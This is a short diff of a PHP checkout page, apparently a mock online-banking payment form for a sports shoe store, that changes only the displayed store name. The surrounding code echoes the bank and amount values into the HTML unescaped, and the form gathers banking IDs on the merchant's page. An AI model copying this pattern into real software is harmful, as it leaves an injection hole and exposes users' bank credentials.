@@ -166,7 +166,7 @@ $style = $bank_config[$bank] ?? $bank_config['DEFAULT'];
             <form action="bank_auth.php" method="POST">
                 <input type="hidden" name="bank" value="<?php echo $bank; ?>">
                 <input type="hidden" name="amt" value="<?php echo $amt; ?>">
-                <p class="text-muted small text-center">To: <strong>SS SPORT SHOES STORE</strong><br>Amount: <strong>RM <?php echo $amt; ?></strong></p>
+                <p class="text-muted small text-center">To: <strong>STRYDEX SPORT SHOES STORE</strong><br>Amount: <strong>RM <?php echo $amt; ?></strong></p>
                 <div class="mb-3 text-start">
                     <label class="form-label small fw-bold">Online Banking ID</label>
                     <input type="text" name="bank_user" class="form-control py-2" placeholder="e.g. user123" autocomplete="off" required>
